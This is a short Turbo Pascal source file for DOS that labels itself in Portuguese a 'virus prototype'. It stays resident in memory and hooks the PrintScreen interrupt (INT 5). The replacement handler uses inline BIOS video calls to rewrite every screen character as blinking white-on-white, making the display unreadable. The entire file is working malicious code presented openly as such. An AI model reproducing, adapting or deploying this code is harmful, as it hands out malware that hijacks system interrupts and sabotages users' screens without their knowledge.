Program FalsePrtScr;
{$M 8192,0,0}
uses CRT,DOS;
var SaveIntr : pointer;
Procedure Partida;
interrupt;
var x,y : byte;
begin
   for x:=1 to 80 do
   for y:=1 to 25 do
   begin
      gotoxy(x,y);
      inline($b4/$08/               { MOV AH,0008 }
             $cd/$10/               { INT 10      }
             $b9/$01/$00/           { MOV CX,0001 }
             $b3/$FF/               { MOV BL,FF   }
             $b4/$09/               { MOV AH,0009 }
             $cd/$10);              { INT 10      }
      delay(3);
   end;
end;

begin
   getintvec($05,SaveIntr);
   setintvec($05,@Partida);
   writeln;
   writeln('Virus-Prototipo - PrtScr Ativado!!!');
   writeln;
   keep(768);
end.
